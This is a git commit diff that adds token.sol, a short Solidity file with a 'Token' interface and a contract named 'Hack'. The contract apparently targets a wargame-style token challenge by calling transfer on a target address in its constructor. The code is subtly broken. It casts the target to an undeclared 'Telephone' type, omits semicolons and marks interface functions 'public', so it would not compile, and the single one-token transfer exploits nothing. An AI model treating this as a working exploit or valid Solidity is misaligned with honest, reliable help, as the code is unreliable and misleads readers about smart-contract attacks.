b7c86f399a5b7bfce8d3599a5cadc15d30f14a05
m1n9 <149402250+mi1n9@users.noreply.github.com>
2025-11-18 16:15:51 +0800

    Update token.sol

--- token.sol
+++ token.sol
@@ -1,1 +1,12 @@
+pragma solidity ^0.8.0;
 
+interface Token {
+function balanceOf(address _) public view returns (uint256)
+function transfer(address _to, uint256 _value) public returns (bool)
+}
+
+contract Hack {
+  constructor(address _target){
+   Telephone(_target).transfer(msg.sender,1);
+  }
+}
